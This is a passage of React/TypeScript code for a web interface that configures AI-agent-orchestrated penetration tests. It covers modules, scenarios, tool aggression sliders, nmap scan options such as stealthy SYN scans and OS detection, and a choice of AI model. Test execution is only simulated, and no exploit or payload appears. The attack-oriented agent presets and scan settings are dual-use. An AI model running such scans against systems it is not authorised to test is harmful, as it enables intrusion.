        ...prev.aiAgent,
        customSystemPrompts: {
          ...prev.aiAgent.customSystemPrompts,
          [name]: prompt
        }
      },
      metadata: { ...prev.metadata, modified: new Date().toISOString() }
    }));

    toast({
      title: "Prompt Saved",
      description: `Custom prompt "${name}" has been saved successfully`,
    });
  }, []);

  // State for prompt management dialog
  const [showPromptManager, setShowPromptManager] = useState(false);
  const [newPromptName, setNewPromptName] = useState('');
  const [newPromptContent, setNewPromptContent] = useState('');

  /**
   * Get prompt behavior description for UI
   */
  const getPromptBehaviorDescription = (promptKey: string): string => {
    const descriptions: Record<string, string> = {
      'pentest-expert': 'Professional, detailed analysis with compliance focus',
      'red-team': 'Creative attack vectors with advanced tactics',
      'compliance-focused': 'Regulatory alignment and documentation emphasis',
      'beginner-friendly': 'Educational explanations with safety emphasis'
    };
    return descriptions[promptKey] || 'Custom behavior as defined in prompt';
  };

  /**
   * Export configuration to JSON
   */
  const exportConfiguration = useCallback(() => {
    try {
      const dataStr = JSON.stringify(configuration, null, 2);
      const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
      
      const exportFileDefaultName = `pentest-config-${new Date().toISOString().split('T')[0]}.json`;
      
      const linkElement = document.createElement('a');
      linkElement.setAttribute('href', dataUri);
      linkElement.setAttribute('download', exportFileDefaultName);
      linkElement.click();
      
      toast({
        title: "Configuration Exported",
        description: "Configuration has been exported successfully",
      });
    } catch (error) {
      toast({
        title: "Export Failed",
        description: "Failed to export configuration",
        variant: "destructive"
      });
    }
  }, [configuration]);

  /**
   * Start penetration test execution
   */
  const startPentest = useCallback(() => {
    const enabledModules = configuration.modules.filter(m => m.enabled);
    const enabledTools = configuration.tools.filter(t => t.enabled);
    
    if (enabledModules.length === 0) {
      toast({
        title: "No Modules Selected",
        description: "Please select at least one module to run",
        variant: "destructive"
      });
      return;
    }
    
    if (enabledTools.length === 0) {
      toast({
        title: "No Tools Selected",
        description: "Please select at least one tool to run",
        variant: "destructive"
      });
      return;
    }
    
    setIsRunning(true);
    toast({
      title: "Pentest Started",
      description: `Starting penetration test with ${enabledModules.length} modules and ${enabledTools.length} tools`,
    });
    
    // Simulate pentest execution (replace with actual backend call)
    setTimeout(() => {
      setIsRunning(false);
      toast({
        title: "Pentest Completed",
        description: "Penetration test has completed successfully",
      });
    }, 5000);
  }, [configuration]);

  // ===========================
  // UTILITY FUNCTIONS
  // ===========================

  /**
   * Get category icon for tools and modules
   */
  const getCategoryIcon = (category: string) => {
    const iconMap: Record<string, React.ComponentType<any>> = {
      network: Network,
      web: Globe,
      ad: Lock,
      osint: Search,
      mobile: Target,
      cloud: Database,
      social: Bot,
      reconnaissance: Eye,
      'vulnerability-assessment': Shield,
      exploitation: Zap,
      'post-exploitation': Terminal,
      reporting: FileText
    };
    
    const IconComponent = iconMap[category] || Terminal;
    return <IconComponent className="w-4 h-4" />;
  };

  /**
   * Get risk level badge variant
   */
  const getRiskBadgeVariant = (risk: string) => {
    switch (risk) {
      case 'low': return 'secondary';
      case 'medium': return 'default';
      case 'high': return 'destructive';
      case 'critical': return 'destructive';
      default: return 'secondary';
    }
  };

  // ===========================
  // RENDER COMPONENT
  // ===========================

  return (
    <div className="flex flex-col w-full">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b bg-muted/30 flex-shrink-0">
        <div className="flex items-center gap-3">
          <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-primary/10">
            <Shield className="w-5 h-5 text-primary" />
          </div>
          <div>
            <h2 className="text-xl font-bold">Enhanced Agentic Pentest Interface</h2>
            <p className="text-sm text-muted-foreground">Production-ready penetration testing configuration</p>
          </div>
        </div>
        
        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={exportConfiguration}
            className="flex items-center gap-2"
          >
            <Download className="w-4 h-4" />
            Export
          </Button>
          
          <Button
            onClick={startPentest}
            disabled={isRunning}
            className="flex items-center gap-2"
          >
            {isRunning ? (
              <>
                <Pause className="w-4 h-4" />
                Running...
              </>
            ) : (
              <>
                <Play className="w-4 h-4" />
                Start Pentest
              </>
            )}
          </Button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex flex-1 overflow-hidden">
        {/* Left Panel - Module Configuration */}
        <div className="w-1/2 border-r flex flex-col">
          <div className="p-4 border-b bg-muted/20">
            <h3 className="font-semibold flex items-center gap-2">
              <Settings className="w-4 h-4" />
              Module Configuration
            </h3>
            <p className="text-sm text-muted-foreground mt-1">
              Configure and enable penetration testing modules
            </p>
          </div>
          
          <Tabs value={activeLeftTab} onValueChange={setActiveLeftTab} className="flex-1 flex flex-col">
            <div className="px-4 pt-2 border-b">
              <TabsList className="grid grid-cols-3 w-full">
                <TabsTrigger value="modules">Modules</TabsTrigger>
                <TabsTrigger value="scenarios">Scenarios</TabsTrigger>
                <TabsTrigger value="metadata">Metadata</TabsTrigger>
              </TabsList>
            </div>
            
            <ScrollArea className="flex-1 h-full">
              <div className="p-4">
                <TabsContent value="modules" className="space-y-4 mt-0">
                {configuration.modules.map((module) => (
                  <Card key={module.id} className={`transition-all ${
                    module.enabled 
                      ? 'bg-primary/5 border-primary/30 shadow-sm' 
                      : 'bg-muted/20 border-border/50'
                  }`}>
                    <CardContent className="pt-4">
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex items-start gap-3 flex-1">
                          <div className="flex-shrink-0 mt-1">
                            {getCategoryIcon(module.category)}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h4 className="font-semibold text-sm">{module.name}</h4>
                              <Badge variant={getRiskBadgeVariant(module.riskLevel)} className="text-xs">
                                {module.riskLevel}
                              </Badge>
                            </div>
                            <p className="text-xs text-muted-foreground mb-2 line-clamp-2">
                              {module.description}
                            </p>
                            <div className="flex items-center gap-3 text-xs text-muted-foreground">
                              <div className="flex items-center gap-1">
                                <Clock className="w-3 h-3" />
                                {module.estimatedTime}
                              </div>
                              <div className="flex items-center gap-1">
                                <TrendingUp className="w-3 h-3" />
                                Priority {module.priority}
                              </div>
                            </div>
                          </div>
                        </div>
                        <Switch
                          checked={module.enabled}
                          onCheckedChange={() => toggleModule(module.id)}
                        />
                      </div>
                      
                      {module.enabled && (
                        <div className="mt-3 pt-3 border-t space-y-2">
                          <div className="text-xs">
                            <Label className="font-medium">Required Tools:</Label>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {module.requiredTools.map((tool) => (
                                <Badge key={tool} variant="outline" className="text-xs">
                                  {tool}
                                </Badge>
                              ))}
                            </div>
                          </div>
                          
                          {module.prerequisites && (
                            <div className="text-xs">
                              <Label className="font-medium">Prerequisites:</Label>
                              <div className="flex flex-wrap gap-1 mt-1">
                                {module.prerequisites.map((prereq) => (
                                  <Badge key={prereq} variant="secondary" className="text-xs">
                                    {prereq}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </TabsContent>
              
              <TabsContent value="scenarios" className="space-y-4 mt-0">
                {configuration.scenarios.map((scenario) => (
                  <Card key={scenario.id} className={`transition-all ${
                    scenario.enabled 
                      ? 'bg-primary/5 border-primary/30 shadow-sm' 
                      : 'bg-muted/20 border-border/50'
                  }`}>
                    <CardContent className="pt-4">
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex items-start gap-3 flex-1">
                          <div className="flex-shrink-0 mt-1">
                            <Target className="w-4 h-4 text-primary" />
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h4 className="font-semibold text-sm">{scenario.name}</h4>
                              <Badge variant={getRiskBadgeVariant(scenario.riskLevel)} className="text-xs">
                                {scenario.riskLevel}
                              </Badge>
                              <Badge variant="secondary" className="text-xs">
                                {scenario.category}
                              </Badge>
                            </div>
                            <p className="text-xs text-muted-foreground mb-2 line-clamp-2">
                              {scenario.description}
                            </p>
                            <div className="flex items-center gap-3 text-xs text-muted-foreground">
                              <div className="flex items-center gap-1">
                                <Clock className="w-3 h-3" />
                                {scenario.estimatedTotalTime}
                              </div>
                              <div className="flex items-center gap-1">
                                <Settings className="w-3 h-3" />
                                {scenario.phases.length} phases
                              </div>
                              <div className="flex items-center gap-1">
                                <Globe className="w-3 h-3" />
                                {scenario.targetEnvironment}
                              </div>
                            </div>
                          </div>
                        </div>
                        <Switch
                          checked={scenario.enabled}
                          onCheckedChange={() => toggleScenario(scenario.id)}
                        />
                      </div>
                      
                      {scenario.enabled && (
                        <div className="mt-3 pt-3 border-t space-y-3">
                          <div className="text-xs">
                            <Label className="font-medium mb-2 block">Execution Phases:</Label>
                            <div className="space-y-2 max-h-64 overflow-y-auto pr-2 scrollbar-thin scrollbar-thumb-primary/30 scrollbar-track-transparent">
                              {scenario.phases.map((phase, index) => (
                                <div key={phase.id} className={`flex items-center justify-between p-2 rounded-md border ${
                                  phase.enabled ? 'bg-secondary/50' : 'bg-muted/30'
                                }`}>
                                  <div className="flex items-center gap-2 flex-1">
                                    <span className="text-xs font-medium text-muted-foreground w-6">
                                      {index + 1}.
                                    </span>
                                    <div className="flex-1">
                                      <div className="flex items-center gap-2">
                                        <span className="text-xs font-medium">{phase.name}</span>
                                        <Badge 
                                          variant={
                                            phase.executionType === 'automatic' ? 'default' :
                                            phase.executionType === 'manual' ? 'secondary' :
                                            phase.executionType === 'dry-run' ? 'outline' : 'destructive'
                                          } 
                                          className="text-xs"
                                        >
                                          {phase.executionType}
                                        </Badge>
                                        {phase.riskLevel === 'critical' && (
                                          <AlertTriangle className="w-3 h-3 text-destructive" />
                                        )}
                                      </div>
                                      <p className="text-xs text-muted-foreground mt-1">
                                        {phase.description}
                                      </p>
                                    </div>
                                    <div className="text-xs text-muted-foreground">
                                      {phase.estimatedTime}
                                    </div>
                                  </div>
                                  <Switch
                                    checked={phase.enabled}
                                    onCheckedChange={() => toggleScenarioPhase(scenario.id, phase.id)}
                                  />
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </TabsContent>
              
              <TabsContent value="metadata" className="space-y-4 mt-0">
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base">Configuration Metadata</CardTitle>
                    <CardDescription>
                      Basic information about this penetration test configuration
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label htmlFor="config-name">Configuration Name</Label>
                      <Input
                        id="config-name"
                        value={configuration.metadata.name}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, name: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="Enter configuration name"
                      />
                    </div>
                    
                    <div>
                      <Label htmlFor="config-description">Description</Label>
                      <Textarea
                        id="config-description"
                        value={configuration.metadata.description}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, description: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="Describe the purpose and scope of this configuration"
                        rows={3}
                      />
                    </div>
                    
                    <div>
                      <Label htmlFor="config-target">Target</Label>
                      <Input
                        id="config-target"
                        value={configuration.metadata.target}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, target: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="Target system or domain"
                      />
                    </div>
                    
                    <div>
                      <Label htmlFor="config-scope">Scope</Label>
                      <Textarea
                        id="config-scope"
                        value={configuration.metadata.scope}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, scope: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="Define the scope and boundaries of the test"
                        rows={2}
                      />
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <Target className="w-4 h-4" />
                      Target Configuration
                    </CardTitle>
                    <CardDescription>
                      Configure IP ranges, port ranges, and target specifications for network scanning
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label htmlFor="ip-ranges">IP Ranges</Label>
                      <Textarea
                        id="ip-ranges"
                        value={configuration.metadata.ipRanges || ''}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, ipRanges: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="192.168.1.0/24&#10;10.0.0.1-10.0.0.100&#10;172.16.0.1"
                        rows={3}
                        className="font-mono text-sm"
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        Enter IP ranges in CIDR notation (192.168.1.0/24), range format (10.0.0.1-10.0.0.100), or individual IPs. One per line.
                      </p>
                    </div>
                    
                    <div>
                      <Label htmlFor="port-ranges">Port Ranges</Label>
                      <Input
                        id="port-ranges"
                        value={configuration.metadata.portRanges || ''}
                        onChange={(e) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, portRanges: e.target.value, modified: new Date().toISOString() }
                        }))}
                        placeholder="1-65535, 80,443,8080, 22-25"
                        className="font-mono text-sm"
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        Enter port ranges (1-1000), individual ports (80,443), or combinations. Default: top 1000 ports.
                      </p>
                    </div>

                    <div className="flex gap-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setConfiguration(prev => ({
                          ...prev,
                          metadata: { 
                            ...prev.metadata, 
                            portRanges: '1-1000', 
                            modified: new Date().toISOString() 
                          }
                        }))}
                        className="text-xs"
                      >
                        Top 1000
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setConfiguration(prev => ({
                          ...prev,
                          metadata: { 
                            ...prev.metadata, 
                            portRanges: '80,443,8080,8443,22,21,23,25,53,110,995,993,143,587', 
                            modified: new Date().toISOString() 
                          }
                        }))}
                        className="text-xs"
                      >
                        Common Ports
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setConfiguration(prev => ({
                          ...prev,
                          metadata: { 
                            ...prev.metadata, 
                            portRanges: '1-65535', 
                            modified: new Date().toISOString() 
                          }
                        }))}
                        className="text-xs"
                      >
                        All Ports
                      </Button>
                    </div>

                    <div>
                      <Label htmlFor="scan-technique">Scan Technique</Label>
                      <Select
                        value={configuration.metadata.scanTechnique || 'syn'}
                        onValueChange={(value: any) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, scanTechnique: value, modified: new Date().toISOString() }
                        }))}
                      >
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="syn">SYN Scan (-sS) - Fast, stealthy</SelectItem>
                          <SelectItem value="tcp">TCP Connect (-sT) - Reliable</SelectItem>
                          <SelectItem value="udp">UDP Scan (-sU) - UDP services</SelectItem>
                          <SelectItem value="ack">ACK Scan (-sA) - Firewall detection</SelectItem>
                          <SelectItem value="comprehensive">Comprehensive (-sS -sU) - TCP + UDP</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="aggressive-timing" className="text-sm">Aggressive Timing (-T4)</Label>
                      <Switch
                        id="aggressive-timing"
                        checked={configuration.metadata.aggressiveTiming || false}
                        onCheckedChange={(checked) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, aggressiveTiming: checked, modified: new Date().toISOString() }
                        }))}
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="service-detection" className="text-sm">Service Detection (-sV)</Label>
                      <Switch
                        id="service-detection"
                        checked={configuration.metadata.serviceDetection || true}
                        onCheckedChange={(checked) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, serviceDetection: checked, modified: new Date().toISOString() }
                        }))}
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="os-detection" className="text-sm">OS Detection (-O)</Label>
                      <Switch
                        id="os-detection"
                        checked={configuration.metadata.osDetection || false}
                        onCheckedChange={(checked) => setConfiguration(prev => ({
                          ...prev,
                          metadata: { ...prev.metadata, osDetection: checked, modified: new Date().toISOString() }
                        }))}
                      />
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              </div>
            </ScrollArea>
          </Tabs>
        </div>

        {/* Right Panel - Framework & Tool Configuration */}
        <div className="w-1/2 flex flex-col">
          <div className="p-4 border-b bg-muted/20">
            <h3 className="font-semibold flex items-center gap-2">
              <Zap className="w-4 h-4" />
              Framework & Tool Configuration
            </h3>
            <p className="text-sm text-muted-foreground mt-1">
              Select frameworks, configure tools, and set aggression levels
            </p>
          </div>
          
          <Tabs value={activeRightTab} onValueChange={setActiveRightTab} className="flex-1 flex flex-col">
            <div className="px-4 pt-2 border-b">
              <TabsList className="grid grid-cols-4 w-full">
                <TabsTrigger value="frameworks">Frameworks</TabsTrigger>
                <TabsTrigger value="tools">Tools</TabsTrigger>
                <TabsTrigger value="ai-agent">AI Agent</TabsTrigger>
                <TabsTrigger value="settings">Settings</TabsTrigger>
              </TabsList>
            </div>
            
            <ScrollArea className="flex-1 h-full">
              <div className="p-4">
                <TabsContent value="frameworks" className="space-y-4 mt-0">
                {configuration.frameworks.map((framework) => (
                  <Card key={framework.id} className={`transition-all ${
                    framework.enabled 
                      ? 'bg-primary/5 border-primary/30 shadow-sm' 
                      : 'bg-muted/20 border-border/50'
                  }`}>
                    <CardContent className="pt-4">
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <h4 className="font-semibold text-sm">{framework.name}</h4>
                            <Badge variant="outline" className="text-xs">
                              v{framework.version}
                            </Badge>
                          </div>
                          <p className="text-xs text-muted-foreground mb-2">
                            {framework.description}
                          </p>
                          <div className="flex flex-wrap gap-1">
                            {framework.categories.map((category) => (
                              <Badge key={category} variant="secondary" className="text-xs">
                                {category}
                              </Badge>
                            ))}
                          </div>
                        </div>
                        <Switch
                          checked={framework.enabled}
                          onCheckedChange={() => toggleFramework(framework.id)}
                        />
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </TabsContent>
              
              <TabsContent value="tools" className="space-y-4 mt-0">
                {configuration.tools.map((tool) => (
                  <Card key={tool.id} className={`transition-all ${
                    tool.enabled 
                      ? 'bg-primary/5 border-primary/30 shadow-sm' 
                      : 'bg-muted/20 border-border/50'
                  }`}>
                    <CardContent className="pt-4">
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex items-start gap-3 flex-1">
                          <div className="flex-shrink-0 mt-1">
                            {getCategoryIcon(tool.category)}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h4 className="font-semibold text-sm">{tool.name}</h4>
                              <Badge variant="outline" className="text-xs">
                                v{tool.version}
                              </Badge>
                              <Badge variant={getRiskBadgeVariant(tool.riskLevel)} className="text-xs">
                                {tool.riskLevel}
                              </Badge>
                            </div>
                            <p className="text-xs text-muted-foreground mb-2">
                              {tool.description}
                            </p>
                          </div>
                        </div>
                        <Switch
                          checked={tool.enabled}
                          onCheckedChange={() => toggleTool(tool.id)}
                        />
                      </div>
                      
                      {tool.enabled && (
                        <div className="mt-3 pt-3 border-t space-y-3">
                          <div>
                            <div className="flex items-center justify-between mb-2">
                              <Label className="text-xs font-medium">Aggression Level</Label>
                              <Badge variant="outline" className="text-xs">
                                {tool.aggressionLevel}/5
                              </Badge>
                            </div>
                            <Slider
                              value={[tool.aggressionLevel]}
                              onValueChange={([value]) => updateToolAggression(tool.id, value)}
                              max={5}
                              min={1}
                              step={1}
                              className="w-full"
                            />
                            <div className="flex justify-between text-xs text-muted-foreground mt-1">
                              <span>Passive</span>
                              <span>Aggressive</span>
                            </div>
                          </div>
                          
                          {tool.requiresConfirmation && (
                            <div className="flex items-center gap-2 text-xs text-accent">
                              <AlertTriangle className="w-3 h-3" />
                              <span>Requires manual confirmation before execution</span>
                            </div>
                          )}
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </TabsContent>
              
              {/* AI Agent Configuration Tab */}
              <TabsContent value="ai-agent" className="space-y-4 mt-0">
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <Bot className="w-4 h-4" />
                      AI Agent Configuration
                    </CardTitle>
                    <CardDescription>
                      Configure the AI agent that will orchestrate and analyze the penetration test
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Model Selection */}
                    <div className="space-y-3">
                      <div>
                        <Label htmlFor="primary-model">Primary AI Model</Label>
                        <div className="flex items-center gap-2 mb-2">
                          <Switch
                            checked={configuration.aiAgent.useLocalModel}
                            onCheckedChange={(checked) => updateAIAgentConfig('useLocalModel', checked)}
                          />
                          <Label className="text-sm">Use Local Model</Label>
                        </div>
                        
                        {configuration.aiAgent.useLocalModel ? (
                          <div className="space-y-3 p-3 border rounded-lg bg-muted/20">
                            <div className="grid grid-cols-2 gap-3">
                              <div>
                                <Label htmlFor="local-provider">Provider</Label>
                                <Select 
                                  value={configuration.aiAgent.localModelConfig.provider} 
                                  onValueChange={(value: any) => updateLocalModelConfig('provider', value)}
                                >
                                  <SelectTrigger>
                                    <SelectValue />
                                  </SelectTrigger>
                                  <SelectContent>
                                    <SelectItem value="ollama">
                                      <div className="flex items-center gap-2">
                                        <Badge variant="secondary" className="text-xs">Popular</Badge>
                                        Ollama
                                      </div>
                                    </SelectItem>
                                    <SelectItem value="lm-studio">LM Studio</SelectItem>
                                    <SelectItem value="text-generation-webui">Text Generation WebUI</SelectItem>
                                    <SelectItem value="custom">Custom API</SelectItem>
                                  </SelectContent>
                                </Select>
                              </div>
                              
                              <div>
                                <Label htmlFor="local-model-name">Model Name</Label>
                                <Input
                                  id="local-model-name"
                                  value={configuration.aiAgent.localModelConfig.modelName}
                                  onChange={(e) => updateLocalModelConfig('modelName', e.target.value)}
                                  placeholder="llama2, mistral-7b, etc."
                                />
                              </div>
                            </div>
                            
                            <div className="grid grid-cols-2 gap-3">
                              <div>
                                <Label htmlFor="local-endpoint">API Endpoint</Label>
                                <Input
                                  id="local-endpoint"
                                  value={configuration.aiAgent.localModelConfig.apiEndpoint}
                                  onChange={(e) => updateLocalModelConfig('apiEndpoint', e.target.value)}
                                  placeholder="http://localhost"
                                />
                              </div>
                              
                              <div>
                                <Label htmlFor="local-port">Port</Label>
                                <Input
                                  id="local-port"
                                  type="number"
                                  value={configuration.aiAgent.localModelConfig.port}
                                  onChange={(e) => updateLocalModelConfig('port', parseInt(e.target.value) || 11434)}
                                  placeholder="11434"
                                />
                              </div>
                            </div>
                            
                            <div className="grid grid-cols-2 gap-3">
                              <div>
                                <Label htmlFor="local-timeout">Timeout (ms)</Label>
                                <Input
                                  id="local-timeout"
                                  type="number"
                                  value={configuration.aiAgent.localModelConfig.timeout}
                                  onChange={(e) => updateLocalModelConfig('timeout', parseInt(e.target.value) || 30000)}
                                  placeholder="30000"
                                />
                              </div>
                              
                              <div>
                                <Label htmlFor="local-retries">Max Retries</Label>
                                <Input
                                  id="local-retries"
                                  type="number"
                                  value={configuration.aiAgent.localModelConfig.maxRetries}
                                  onChange={(e) => updateLocalModelConfig('maxRetries', parseInt(e.target.value) || 3)}
                                  min="1"
                                  max="10"
                                />
                              </div>
                            </div>
                            
                            {(configuration.aiAgent.localModelConfig.provider === 'custom' || 
                              configuration.aiAgent.localModelConfig.provider === 'text-generation-webui') && (
                              <div>
                                <Label htmlFor="local-api-key">API Key (Optional)</Label>
                                <Input
                                  id="local-api-key"
                                  type="password"
                                  value={configuration.aiAgent.localModelConfig.apiKey || ''}
                                  onChange={(e) => updateLocalModelConfig('apiKey', e.target.value)}
                                  placeholder="Optional authentication key"
                                />
                              </div>
                            )}
                            
                            <div className="flex items-center justify-between p-2 bg-blue-50 dark:bg-blue-950/30 rounded border border-blue-200 dark:border-blue-800">
                              <div className="text-sm">
                                <div className="font-medium">Endpoint Preview:</div>
                                <div className="text-muted-foreground">
                                  {configuration.aiAgent.localModelConfig.apiEndpoint}:{configuration.aiAgent.localModelConfig.port}
                                </div>
                              </div>
                              <Badge variant="outline" className="text-xs">
                                {configuration.aiAgent.localModelConfig.provider}
                              </Badge>
                            </div>
                          </div>
                        ) : (
                          <Select 
                            value={configuration.aiAgent.model} 
                            onValueChange={(value) => updateAIAgentConfig('model', value)}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="gpt-5-2025-08-07">
                                <div className="flex items-center gap-2">
                                  <Badge variant="secondary" className="text-xs">Latest</Badge>
                                  GPT-5 (Flagship Model)
                                </div>
                              </SelectItem>
                              <SelectItem value="gpt-4.1-2025-04-14">GPT-4.1 (Reliable Performance)</SelectItem>
                              <SelectItem value="gpt-5-mini-2025-08-07">GPT-5 Mini (Fast & Efficient)</SelectItem>
                              <SelectItem value="claude-opus-4-20250514">
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline" className="text-xs">Anthropic</Badge>
                                  Claude Opus 4 (Most Capable)
                                </div>
                              </SelectItem>
                              <SelectItem value="claude-sonnet-4-20250514">
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline" className="text-xs">Anthropic</Badge>
                                  Claude Sonnet 4 (High Performance)
                                </div>
                              </SelectItem>
                              <SelectItem value="claude-3-5-haiku-20241022">Claude Haiku (Fastest Response)</SelectItem>
                            </SelectContent>
                          </Select>
                        )}
                        
                        <p className="text-xs text-muted-foreground mt-1">
                          {configuration.aiAgent.useLocalModel 
                            ? 'Configure your local AI model for enhanced privacy and control'
                            : 'Primary model for analysis, decision-making, and report generation'
                          }
                        </p>
                      </div>

                      <div>
                        <Label htmlFor="fallback-model">Fallback Model</Label>
                        <Select 
                          value={configuration.aiAgent.fallbackModel} 
                          onValueChange={(value) => updateAIAgentConfig('fallbackModel', value)}
                        >
                          <SelectTrigger>
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="gpt-4.1-2025-04-14">GPT-4.1 (Reliable)</SelectItem>
                            <SelectItem value="gpt-5-mini-2025-08-07">GPT-5 Mini (Fast)</SelectItem>
                            <SelectItem value="gpt-5-nano-2025-08-07">GPT-5 Nano (Fastest)</SelectItem>
                            <SelectItem value="claude-3-5-haiku-20241022">Claude Haiku (Quick)</SelectItem>
                          </SelectContent>
                        </Select>
                        <p className="text-xs text-muted-foreground mt-1">
                          Backup model used when primary model is unavailable
                        </p>
                      </div>
                    </div>

                    <Separator />

                    {/* Advanced Model Settings */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <div>
                          <Label>Enable Reasoning Mode</Label>
                          <p className="text-xs text-muted-foreground">Use specialized reasoning models for complex analysis</p>
                        </div>
                        <Switch
                          checked={configuration.aiAgent.enableReasoningMode}
                          onCheckedChange={(checked) => updateAIAgentConfig('enableReasoningMode', checked)}
                        />
                      </div>

                      {configuration.aiAgent.enableReasoningMode && (
                        <div>
                          <Label htmlFor="reasoning-model">Reasoning Model</Label>
                          <Select 
                            value={configuration.aiAgent.reasoningModel} 
                            onValueChange={(value) => updateAIAgentConfig('reasoningModel', value)}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="o3-2025-04-16">
                                <div className="flex items-center gap-2">
                                  <Badge variant="destructive" className="text-xs">Pro</Badge>
                                  O3 (Most Powerful Reasoning)
                                </div>
                              </SelectItem>
                              <SelectItem value="o4-mini-2025-04-16">O4 Mini (Fast Reasoning)</SelectItem>
                            </SelectContent>
                          </Select>
                          <p className="text-xs text-muted-foreground mt-1">
                            Specialized model for multi-step analysis and complex problem-solving
                          </p>
                        </div>
                      )}

                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <Label>Temperature: {configuration.aiAgent.temperature}</Label>
                          <Slider
                            value={[configuration.aiAgent.temperature]}
                            onValueChange={([value]) => updateAIAgentConfig('temperature', parseFloat(value.toFixed(1)))}
                            max={1}
                            min={0}
                            step={0.1}
                            className="w-full mt-2"
                          />
                          <div className="flex justify-between text-xs text-muted-foreground mt-1">
                            <span>Focused</span>
                            <span>Creative</span>
                          </div>
                        </div>
                        
                        <div>
                          <Label htmlFor="max-tokens">Max Tokens</Label>
                          <Input
                            id="max-tokens"
                            type="number"
                            value={configuration.aiAgent.maxTokens}
                            onChange={(e) => updateAIAgentConfig('maxTokens', parseInt(e.target.value) || 2000)}
                            min={100}
                            max={8000}
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <Label htmlFor="response-format">Response Format</Label>
                          <Select 
                            value={configuration.aiAgent.responseFormat} 
                            onValueChange={(value) => updateAIAgentConfig('responseFormat', value)}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="structured">Structured (Recommended)</SelectItem>
                              <SelectItem value="json">JSON</SelectItem>
                              <SelectItem value="text">Plain Text</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>

                        <div>
                          <Label htmlFor="safety-level">Safety Level</Label>
                          <Select 
                            value={configuration.aiAgent.safetyLevel} 
                            onValueChange={(value) => updateAIAgentConfig('safetyLevel', value)}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                               <SelectItem value="high">
                                 <div className="flex items-center gap-2">
                                   <CheckCircle className="w-3 h-3 text-primary" />
                                   <span className="text-sm">High (Security Professionals)</span>
                                   <Badge variant="outline" className="ml-auto text-xs">
                                     Requires Experience
                                   </Badge>
                                 </div>
                               </SelectItem>
                               <SelectItem value="medium">
                                 <div className="flex items-center gap-2 p-2 rounded-md bg-muted/20">
                                   <AlertTriangle className="w-3 h-3 text-accent" />
                                   <span className="text-sm">Medium (Intermediate Users)</span>
                                 </div>
                               </SelectItem>
                               <SelectItem value="low">
